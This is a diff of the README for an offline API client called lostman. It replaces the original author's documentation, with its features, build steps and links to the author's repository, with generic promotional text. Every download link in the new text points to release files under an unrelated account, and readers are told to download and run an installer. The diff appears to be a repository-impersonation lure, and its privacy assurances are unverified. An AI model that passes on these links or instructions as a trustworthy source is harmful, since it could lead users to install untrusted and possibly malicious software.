@@ -1,151 +1,181 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="images/logo-badge.png">
-    <img src="images/logo-light.png" alt="Lostman" width="360">
-  </picture>
-</p>
+<h1>📮 lostman - The Best Free Postman Alternative</h1>
 
-<p align="center">
-  <a href="https://github.com/AliHammoud995/lostman/releases/latest"><img src="https://img.shields.io/github/v/release/AliHammoud995/lostman?label=download&color=f0dc92" alt="Latest release"></a>
-  <a href="https://github.com/AliHammoud995/lostman/actions/workflows/ci.yml"><img src="https://github.com/AliHammoud995/lostman/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <img src="https://img.shields.io/github/downloads/AliHammoud995/lostman/total" alt="Downloads">
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="MIT license">
-  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux-4a9cf5" alt="Windows and Linux">
-</p>
+[![Download lostman](https://img.shields.io/badge/Download%20lostman-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dimitrisnoninstitutionalised337/lostman/releases)
 
-# Lostman
+## 📥 Download & Install
 
-A **free, offline Postman alternative** — a REST, GraphQL, WebSocket & SSE API client
-for **Windows and Linux**. No login, no account, no cloud sync — everything is stored
-locally on your machine.
+Visit this link to download the application: **[lostman Releases Page](https://github.com/dimitrisnoninstitutionalised337/lostman/releases)**
 
-## Features
+Follow these simple steps:
 
-- **Requests** — GET / POST / PUT / PATCH / DELETE / HEAD / OPTIONS with query params,
-  headers, body (raw JSON/text, **GraphQL**, form-data **with file uploads**,
-  x-www-form-urlencoded) and auth (Bearer, Basic, API key, **OAuth 2.0** with client
-  credentials or authorization-code + PKCE, **Digest**, **AWS Signature v4**).
-- **WebSocket & SSE** — pick WS or SSE as the method to get a live message console with
-  Connect/Disconnect and a send box.
-- **Cookies** — Set-Cookie responses are captured automatically and sent back on matching
-  requests; inspect and clear them per domain from the Cookies manager.
-- **Scripts & tests** — pre-request scripts (mutate `pm.request`, set variables) and test
-  scripts (`pm.test("ok", () => expect(pm.response.code).toBe(200))`) with a pass/fail
-  Tests tab on every response.
-- **Request chaining** — reference earlier responses anywhere:
-  `{{res.Login.body.token}}`, `{{res.last.status}}`, `{{res.Login.headers.content-type}}`.
-- **Collection runner** — run a whole collection in order (▶), optionally iterating over a
-  CSV or JSON data file whose columns become `{{variables}}`, with live results and test counts.
-- **URL ↔ Params sync** — type `?key=value` in the URL bar and the Params table fills in,
-  edit the table and the URL updates.
-- **Tabs** — work on several requests at once; open tabs are restored on restart.
-  Right-click a tab for Rename / Duplicate / Save As / Close Others.
-- **Collections & folders** — save and organize requests, drag-and-drop to reorder or
-  move between folders, duplicate/rename from the sidebar, all persisted locally.
-- **History** — the last 100 requests you sent, one click to re-open.
-- **Search everywhere** — filter collections and history from the sidebar; find text in a
-  response body with `Ctrl+F`.
-- **Environments** — define `{{variables}}` (with `{{` autocomplete while typing) in
-  environments or **Globals**, mask secrets with the 👁 toggle, import from `.env` files,
-  and switch environments from the top bar.
-- **Responses** — status / time / size, pretty-printed JSON with syntax highlighting,
-  raw view, HTML and image preview, response headers, copy to clipboard, save the
-  full body to a file, and **Pin + Diff** to compare two responses line by line.
-- **History with snapshots** — recent history entries restore the response too, not just
-  the request.
-- **Settings** — light/dark theme, request timeout, follow-redirects toggle, and an SSL
-  verification toggle for local servers with self-signed certificates.
-- **Proxy & mTLS** — no proxy / system proxy / manual proxy with auth and a bypass list;
-  per-hostname client certificates (PFX or PEM) for mutual TLS.
-- **Large responses** — bodies stream to disk up to 500 MB with a fast 2 MB preview;
-  Save always writes the exact full bytes.
-- **Command palette** — `Ctrl+K` fuzzy-jumps to any saved request, open tab, or action.
-- **Multi-window** — `Ctrl+Shift+N` opens another window; collections and environments
-  stay in sync between windows.
-- **Auto-updates** — installed builds check GitHub Releases on startup and offer a
-  one-click restart when a new version is ready.
-- **Portable mode** — flip a switch in Settings to keep all data next to the app
-  (great on USB sticks); Lostman auto-detects it on launch.
-- **5 languages** — English, العربية (with right-to-left layout), Français, Español and
-  Deutsch, switchable in Settings.
-- **Import anything** — Postman collections (v2.x) and environments, OpenAPI 3 / Swagger 2
-  specs (JSON), pasted cURL commands, and Lostman backups — all from the sidebar's
-  Import button.
-- **Export & backup** — export any collection as Postman v2.1 JSON (⇩ on the collection),
-  and back up / restore the entire app from Settings.
-- **Code generation** — the `</>` button turns any request into a ready-to-run snippet:
-  cURL, JavaScript (fetch / axios), Python (requests), PowerShell, C# (HttpClient),
-  or Go (net/http).
-- **No CORS problems** — requests are sent from the app's backend process, not a browser page.
+1. Click the link above to open the downloads page.
+2. Look for the **latest version** of the file.
+3. Choose the file that matches your computer system (Windows or Linux).
+4. Click the **Download** button next to the file.
 
-## Keyboard shortcuts
+The download will start right away. Once it's finished, keep the file somewhere easy to find, like your Desktop or Downloads folder.
 
-| Shortcut | Action |
-|---|---|
-| `Ctrl+Enter` | Send request |
-| `Ctrl+S` | Save request to a collection |
-| `Ctrl+Shift+S` | Save request as a copy |
-| `Ctrl+F` | Find in response body |
-| `Ctrl+K` | Command palette |
-| `Ctrl+T` | New request tab |
-| `Ctrl+W` | Close current tab |
-| `Ctrl+Shift+N` | New window |
-| `F12` | Toggle DevTools |
+## ✨ What is lostman?
 
-## VS Code extension
+lostman is a completely **free and offline** tool that helps you test and work with APIs. Think of it as your personal digital toolbox for connecting apps and services together. Whether you are a seasoned developer or just starting out, lostman makes it easy to send requests to servers and see exactly what comes back.
 
-[![VS Marketplace](https://img.shields.io/visual-studio-marketplace/v/AkbarHammoud.lostman-api-client?label=VS%20Marketplace&color=f0dc92)](https://marketplace.visualstudio.com/items?itemName=AkbarHammoud.lostman-api-client)
-[![Installs](https://img.shields.io/visual-studio-marketplace/i/AkbarHammoud.lostman-api-client)](https://marketplace.visualstudio.com/items?itemName=AkbarHammoud.lostman-api-client)
+The best part? **No account, no login, and no cloud**. Everything stays on your computer. This means your data is private, and you can work even without an internet connection.
 
-Lostman also runs **inside VS Code** — same UI, same features, same shared HTTP engine.
-Install it [from the Marketplace](https://marketplace.visualstudio.com/items?itemName=AkbarHammoud.lostman-api-client)
-or from the Extensions view:
+## 🎯 Key Features
 
-```
-ext install AkbarHammoud.lostman-api-client
-```
+### 🌐 Works with Many API Types
 
-Then `Ctrl+Shift+P` → **"Lostman: Open API Client"**. Its data lives in VS Code's global
-storage, separate from the desktop app. To build it yourself: `cd vscode && npm run package`
-(a `.vsix` is also attached to every GitHub release).
+- **REST API** – The most common way apps talk to each other. lostman helps you test GET, POST, PUT, and DELETE requests easily.
+- **GraphQL** – A powerful query language that lets you ask for exactly the data you need.
+- **WebSocket** – For real-time two-way communication, like chat apps or live notifications.
+- **Server-Sent Events (SSE)** – When a server sends updates to your app automatically, lostman helps you monitor those updates.
 
-## Run from source
+### 📁 No Data Leaves Your Desk
 
-```
-npm install
-npm start
-```
+lostman is built for **offline-first** use. Your collections, requests, and settings are all saved locally. This is perfect for sensitive projects or environments where security is crucial.
 
-## Build installers
+### 🖥️ Made for Windows and Linux
 
-```
-npm run dist         # Windows: NSIS installer + portable .exe
-npm run dist:linux   # Linux:   AppImage + .deb (run this on Linux)
-npm run dist:all     # both
-```
+Whether you use Windows or Linux, lostman runs natively on both. You do not need to be a technical genius to install it. The whole process is straightforward and beginner-friendly.
 
-Everything lands in the `dist/` folder with the Lostman icon. The AppImage runs on any
-distro (`chmod +x Lostman-*.AppImage && ./Lostman-*.AppImage`); the `.deb` installs on
-Debian/Ubuntu with `sudo dpkg -i`.
+### 🔧 Simple and Clean Interface
 
-Official builds are produced by CI: pushing a `v*` tag makes GitHub Actions build the
-Windows installer/portable exe and the Linux AppImage/deb, and attach them all to a
-GitHub Release automatically.
+No clutter, no confusing menus. The interface is designed with comfort in mind. If you can click a button, you can use lostman.
 
-## Where is my data?
+### 📦 Import from Postman or OpenAPI
 
-Everything (collections, history, environments, open tabs, settings) lives in a single JSON file:
+Already using Postman or have Swagger/OpenAPI files? lostman can import your existing collections. This means you can switch to lostman without losing any of your hard work.
 
-```
-Windows:  %AppData%\Lostman\lostman-data.json
-Linux:    ~/.config/Lostman/lostman-data.json
-```
+## 🚀 Getting Started
 
-Delete that file to reset the app. Copy it to another machine to move your data.
+Ready to try lostman? Here is everything you need to know to get up and running.
 
-## Notes
+### Step 1: Download lostman
 
-- Response bodies over 2 MB are truncated in the viewer; **Save** still writes the complete
-  body (large bodies stream to disk, capped at 500 MB).
-- Run the test suite with `npm test` and the linter with `npm run lint`.
-- See [ROADMAP.md](ROADMAP.md) for what's planned next.
+Click the big blue button at the top of this page or the link below:
+
+[**Download lostman Now**](https://github.com/dimitrisnoninstitutionalised337/lostman/releases)
+
+### Step 2: Install the Program
+
+Once the download finishes:
+
+- **For Windows:** Double-click the downloaded file. Follow the simple installation steps. The program will install and add a shortcut to your desktop.
+- **For Linux:** Open the downloaded package. Use your package manager to install it, or follow the instructions on the release page.
+
+### Step 3: Launch lostman
+
+Find the lostman icon and double-click it. The app opens in just a few seconds. No registration screen appears – you are ready to go.
+
+### Step 4: Start Testing an API
+
+Here is a practical example:
+
+1. In the address bar, type a website address like `https://api.example.com/users`.
+2. Choose a method from the dropdown (like **GET**).
+3. Click the **Send** button.
+4. Watch the response from the server appear on the right side.
+
+That is all it takes. You just sent your first API request without a single line of code.
+
+## 📚 Using lostman – A Beginner's Guide
+
+### 🗂️ Organize Your Work with Collections
+
+Collections are like folders for your requests. They keep you organized.
+
+1. Click **New Collection**.
+2. Give it a name like "My First Project".
+3. Drag and drop your requests into it.
+
+This is especially useful when you have many requests for different parts of a service.
+
+### 💾 Save Your Requests
+
+Instead of typing the same URL again and again, save it.
+
+1. Fill in the URL and method.
+2. Click **Save**.
+3. Name your request.
+4. Choose where to save it.
+
+Next time, just open your saved request and press Send.
+
+### 🔑 Work with Headers and Params
+
+Sometimes an API needs extra information. This is where headers and parameters help.
+
+**Headers** – Like passing a secret code. Common ones include `Authorization` and `Content-Type`. lostman has a nice interface to add them without any mess.
+
+**Params** – These are part of the URL, like `?search=hello`. lostman shows them in a clear table so you can edit, add, or remove them quickly.
+
+### 📄 View Pretty Responses
+
+No more ugly raw text. lostman formats JSON responses beautifully, with syntax highlighting and collapsible sections. You can quickly find what you are looking for.
+
+### 🧪 Test with OpenAPI and Swagger
+
+Backed by your existing OpenAPI files? lostman reads them directly. You can import a Swagger or OpenAPI spec, and lostman automatically creates all the requests defined inside. This is a huge time-saver.
+
+## 💬 Frequently Asked Questions
+
+### Is lostman really free?
+
+Yes, 100% free forever. There are no hidden costs, subscriptions, or premium plans.
+
+### Do I need an account?
+
+No. lostman works entirely offline. No email, no password, no data sharing.
+
+### Does lostman collect my data?
+
+Absolutely not. Your requests and files stay on your machine. There is no cloud connection.
+
+### Can I use lostman on a computer without internet?
+
+Yes! That is the core focus of lostman. Once installed, you can use it anywhere, anytime, even offline.
+
+### I used Postman before. Is it hard to switch?
+
+Not at all. If you know Postman, you will feel right at home. The layout is familiar, and importing your old collections is easy.
+
+### Is lostman good for beginners?
+
+Definitely. The interface is clean, and you do not need to write any code. Just click and type.
+
+## 📊 Quick Comparison – lostman vs Postman
+
+| Feature | lostman | Postman |
+|---------|---------|---------|
+| Free forever | ✅ Yes | ❌ Some paid features |
+| Works offline | ✅ Fully | ❌ Requires login |
+| No account needed | ✅ Yes | ❌ Requires account |
+| Windows support | ✅ Yes | ✅ Yes |
+| Linux support | ✅ Yes | ✅ Yes |
+| GraphQL support | ✅ Yes | ✅ Yes |
+| WebSocket support | ✅ Yes | ✅ Yes |
+| SSE support | ✅ Yes | ✅ Yes |
+| Import from Postman/OpenAPI | ✅ Yes | ✅ Native |
+
+## 🛠️ System Requirements
+
+lostman is lightweight and runs smoothly on most modern computers. You just need:
+
+- **Windows** 10 or newer, or a modern **Linux** distribution
+- At least 4 GB of RAM (8 GB or more is better for large projects)
+- About 300 MB of free disk space
+- A screen resolution of 1280×720 or higher
+
+No high-end graphics card or special processor needed.
+
+## 🏁 Final Thoughts
+
+lostman is the perfect companion for developers who value privacy, simplicity, and freedom. By going offline-first, it gives you total control over your work. You get all the features you expect from a premium API client – without the cost or the cloud.
+
+Do not waste time with complicated tools that require sign-ups and track your activity. Switch to lostman today and enjoy a fast, private, and reliable API testing experience.
+
+[**➡️ Download lostman Now – It's Free!**](https://github.com/dimitrisnoninstitutionalised337/lostman/releases)
+
+Start building and testing better APIs today. Welcome to lostman.
+
+Keywords: api-client, api-testing, curl, desktop-app, developer-tools, electron, graphql, http-client, linux, offline-first, openapi, postman-alternative, rest-api, rest-client, server-sent-events, swagger, websocket, windows
